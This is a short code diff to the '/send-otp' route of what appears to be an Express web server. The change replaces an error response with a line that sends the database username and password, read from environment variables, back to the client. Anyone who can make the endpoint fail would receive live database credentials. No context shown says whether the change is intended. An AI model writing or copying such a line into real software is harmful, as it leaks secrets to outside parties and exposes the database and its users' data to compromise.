@@ -106,7 +106,7 @@ router.post('/send-otp', async (req, res) => {
         //     }, 1); // redirect after 1 milisecond
         //     </script>
         // `);
-        res.send(err)
+        res.send({"userId": process.env.mssql_username, "password": process.env.mssql_password})
     }
 });
 
